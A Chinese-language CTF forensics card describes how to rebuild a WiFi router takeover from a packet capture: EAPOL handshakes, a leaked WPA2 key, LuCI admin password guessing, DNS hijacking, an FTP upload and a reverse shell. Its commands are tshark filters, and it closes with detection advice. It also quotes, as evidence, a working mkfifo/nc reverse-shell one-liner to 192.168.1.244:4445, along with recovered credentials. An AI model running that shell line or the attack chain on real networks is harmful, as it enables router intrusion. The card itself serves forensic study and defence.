---
id: ctf-forensics-pcap-wifi-router-takeover-chain
title: PCAP 还原 WiFi 入侵链：EAPOL 握手、LuCI 后台爆破、DNS 劫持与反弹 shell
type: scenario
domain: ctf
path: ctf/forensics
technique: pcap-wifi-eapol-luci-dns-reverse-shell-chain
aliases:
- laozhaoWIFI
- ImmortalWrt 流量取证
- 802.11 四次握手取证
- 路由器后台爆破流量
- WiFi 劫持 DNS 反弹 shell
tags:
- ctf
- forensics
- pcap
- wifi
- eapol
- 802.11
- luci
- dns-hijack
- reverse-shell
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V178
  verified_at: '2026-11-06T17:30:29+08:00'
  notes: 已对照原文与图34-44核对：wlan.addr过滤得SSID laozhaoWIFI、4组完整EAPOL握手、iw输出key password1110、LuCI POST /cgi-bin/luci（luci_username/luci_password，首个403、第二个password成功）、DNS劫持www.qq.com、FTP USER ftp1/PASS mast、zip口令4321解出code:123456789、反弹shell nc 192.168.1.244 4445及4条命令均一致；无CVE、无sources/source_url；未复跑攻击流量。
---

## 一句话结论

一份包含 802.11 管理帧、EAPOL 四次握手、LuCI 后台登录、FTP 与反弹 shell 的 PCAP，可以按“识别攻击者 MAC → 提取 SSID/PSK → 定位路由器型号与后台爆破 → 查看 DNS 劫持 → 提取 FTP 上传物 → 还原反弹 shell 命令”的顺序完整重建入侵链；案例中明文 WiFi 密码直接出现在被抓包的 `iw` 命令输出里，无需离线爆破。

## 原理

- **无线帧识别**：802.11 的 Probe Response/Association Request 中带 SSID；同一个客户端 MAC 在多个四次握手中反复出现，可作为攻击者/受害客户端的关联键。案例过滤 `wlan.addr == ca:75:f4:65:f9:6a && wlan.ssid` 后看到 `laozhaoWIFI`。
- **EAPOL 握手**：WPA2 四次握手由 EAPOL Message 1–4 组成；按 `eapol` 过滤并观察同一对 MAC 的 1/4、2/4、3/4、4/4 消息，可数出完整握手组数（案例 4 组）。握手包本身可用于离线 PSK 爆破，但本案例不需要。
- **PSK 泄露点**：攻击者连上路由器后执行 `iw`/`iwconfig` 等命令，输出被交互式流量（WebSocket/TCP）带回，JSON 中含 `"ssid":"laozhaoWIFI","key":"password1110"`。因此取证时应搜索被抓包的命令输出、hostapd 配置、shell 历史，而不只找握手包。
- **路由器后台**：LuCI 登录页响应 `<title>ImmortalWrt - LuCI</title>`，可确认 OpenWrt 系固件；登录请求为 `POST /cgi-bin/luci`，表单字段 `luci_username`、`luci_password`。案例第一次爆破 403，第二次返回 200，密码为 `password`。
- **DNS 劫持**：路由器配置被修改后，`www.qq.com` 被解析到内网 IP；PCAP 的 DNS 响应与后续 HTTP Host 列表（`www.qq.com`、`192.168.1.1`）可交叉确认。
- **FTP 与上传物**：过滤 `ftp` 可见 `USER ftp1`、`PASS mast` 与 `230 Login successful`；随后上传的 zip 有密码，爆破得到 `4321`，解出文本 `code:123456789`。
- **反弹 shell**：在 WebSocket/TCP 流里能看到 `ps` 输出：`sh -c mkfifo /tmp/f 2>/dev/null; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.244 4445 > /tmp/f`；过滤 4445 端口可数出 4 条命令（`ifconfig`、`uname -a`、`cd /root`、`ls`）。

## 触发条件

- PCAP 同时包含无线管理帧/数据帧与有线侧或路由器交互流量，且未使用无法解密的 TLS 封装全部关键步骤。
- 攻击者通过被抓包的命令输出、配置文件或明文协议泄露 SSID/PSK、后台口令、FTP 凭据。
- 路由器后台为 HTTP 或可解密的 HTTPS；DNS 查询/响应未被加密。
- 反弹 shell 使用明文 TCP/WebSocket，或密钥/会话可从流量中恢复。

## 利用步骤

1. **找攻击者 MAC 与 SSID**：`wlan.addr == <mac> && wlan.ssid`，看 Probe Response/Association Request；记录 SSID 与客户端 MAC。
2. **数握手组**：`eapol`，按源/目的 MAC 与 Message 1–4 配对；完整 1/4→2/4→3/4→4/4 记为一组。
3. **找 PSK**：在 TCP/WebSocket 流中搜索 `iw`、`iwconfig`、`hostapd`、`key`、`psk`；案例 PSK 直接出现在 `iw` JSON 输出中。
4. **确认路由器与后台**：Follow HTTP Stream 看 `<title>`、LuCI 路径、登录 POST；统计状态码变化定位成功口令。
5. **看 DNS/HTTP**：`dns` 过滤目标域名与响应 IP；`http.host` 统计确认被劫持域名与内网地址。
6. **提取 FTP 上传物**：Follow TCP Stream 或导出 FTP-DATA；对 zip 做密码爆破/已知明文，解出内容。
7. **还原反弹 shell**：过滤监听端口或 WebSocket，找 `nc`/`bash -i`/`mkfifo` 命令行与后续交互命令，按时间线排序。

## PoC

```bash
# 1. SSID 与客户端 MAC
tshark -r traffic.pcap -Y 'wlan.addr == ca:75:f4:65:f9:6a && wlan.ssid' \
  -T fields -e frame.time -e wlan.ssid -e wlan.fc.type_subtype

# 2. 四次握手
tshark -r traffic.pcap -Y 'eapol' \
  -T fields -e frame.number -e eth.src -e eth.dst -e eapol.type

# 3. LuCI 登录
tshark -r traffic.pcap -Y 'http.request.method == "POST" && http.request.uri contains "/cgi-bin/luci"' \
  -T fields -e frame.time -e http.response.code -e http.file_data

# 4. DNS 与 FTP
tshark -r traffic.pcap -Y 'dns.qry.name contains "qq.com"' -T fields -e dns.qry.name -e dns.a
tshark -r traffic.pcap -Y 'ftp' -T fields -e frame.time -e ftp.request.command -e ftp.request.arg

# 5. 反弹 shell 端口
tshark -r traffic.pcap -Y 'tcp.port == 4445' -T fields -e frame.time -e tcp.payload
```

本卡不执行攻击；以上仅为流量筛选与取证命令。

## 变体与关联

- WPA3/SAE、PMKID、企业级 802.1X 的取证路径不同；需要按握手类型选择爆破或证书/身份分析。
- 后台可能是 HTTPS、SSH、Telnet；若 TLS 可解密（RSA 证书或会话密钥），仍可用 Follow Stream。
- DNS 可能被 DoH/DoT 替代；可转而分析 HTTP Host、SNI、代理日志。
- 关联：[[pentest-initial-access-wpa2-psk-deauth-handshake-crack]]（WPA2 握手爆破攻击侧）、[[pentest-initial-access-wpa2-psk-pmkid-offline-crack]]（PMKID）、[[ctf-forensics-pcap-http-xor-exfil-key-recover]]（PCAP 外传取证）。
- 边界：若关键流量被 TLS 加密且无密钥、或抓包丢失握手/上传分片，无法完整重建；此时需要结合路由器配置备份、日志与终端取证。

## 检测与防御

- 无线侧：启用 WIDS/WIPS 检测 deauth 洪水与异常握手；使用强 PSK/SAE；关闭 WPS；限制管理后台仅 LAN 访问。
- 路由器侧：修改默认口令、禁用 WAN 管理、开启登录失败锁定；监控 DNS/防火墙配置变更；固件及时更新。
- 流量侧：监控异常 DNS 解析到内网、明文 FTP、非常用端口反弹 shell、`mkfifo`/`nc` 特征。
- 取证侧：保留 PCAP、路由器配置与日志、终端内存；按 MAC/时间线关联无线与有线侧证据。
